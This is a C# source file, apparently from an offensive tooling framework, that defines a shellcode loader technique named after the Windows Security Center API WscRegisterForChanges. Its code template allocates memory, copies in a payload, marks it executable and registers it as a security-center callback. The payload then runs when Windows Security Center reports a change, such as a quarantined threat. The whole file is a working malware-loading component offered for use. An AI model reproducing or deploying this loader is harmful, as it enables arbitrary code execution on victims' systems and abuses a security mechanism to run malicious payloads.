using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class WscRegisterForChanges : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "WscRegisterForChanges";

        string ITechnique.TechniqueDescription => @"A callback is set that will be triggered when Windows Security Center (WSC) detects a change that could affect the health of one of the security providers - like when a threat is quarantined. This loader will sleep infinitely waiting for this change.";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "WscRegisterForChanges" };

        List<string> ITechnique.Prerequisites => null;

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}

            IntPtr hCallbackReg = IntPtr.Zero;
            WscRegisterForChanges(IntPtr.Zero, ref hCallbackReg, hAlloc, IntPtr.Zero);

            System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";
    }
}
